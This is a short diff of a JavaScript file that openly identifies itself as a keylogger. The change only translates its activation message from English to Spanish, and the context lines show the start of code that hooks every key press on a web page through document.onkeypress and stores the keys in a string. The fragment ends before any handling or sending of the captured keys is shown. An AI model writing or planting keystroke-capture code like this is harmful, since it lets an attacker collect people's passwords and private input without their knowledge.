@@ -1,4 +1,4 @@
-console.log("Keylogger activation");
+console.log("ACTIVANDO EL KEYLOGGER...");
 var keys='';
 document.onkeypress = function(e) {
   get = window.event?event:e;
